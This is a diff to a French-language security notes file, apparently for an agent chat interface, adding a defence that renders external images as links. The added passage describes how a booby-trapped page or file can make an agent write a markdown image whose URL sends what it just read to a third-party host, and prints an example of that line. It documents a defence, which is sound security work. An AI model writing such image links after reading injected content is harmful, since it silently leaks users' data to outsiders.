@@ -63,6 +63,17 @@ correctif.
   correctif doit être renouvelée : le correctif l'empêche de fuir, il ne la
   déclasse pas.
 
+- **Le rendu des messages** ne charge d'image que depuis l'Atelier lui-même.
+  Une image se charge seule, sans que personne ne clique : c'est le canal
+  d'exfiltration classique des interfaces de conversation. Il suffit qu'un
+  agent lise une page ou un fichier piégé pour qu'on lui fasse écrire
+  `![](https://ailleurs/?d=<ce-qu-il-vient-de-lire>)`, et le navigateur part
+  le livrer en silence au moment de l'affichage. Ici les agents tournent en
+  `bypassPermissions` et lisent ce qu'ils veulent : le canal serait large. Une
+  image d'ailleurs devient donc un lien, que l'on voit avant de le suivre.
+  Vérifié dans le navigateur : au rendu d'un message qui en contient une,
+  aucune requête ne part vers l'hôte tiers.
+
 ## Ce qui reste ouvert
 
 Suivi en issues sur le dépôt. Un projet public qui porte des issues de sécurité
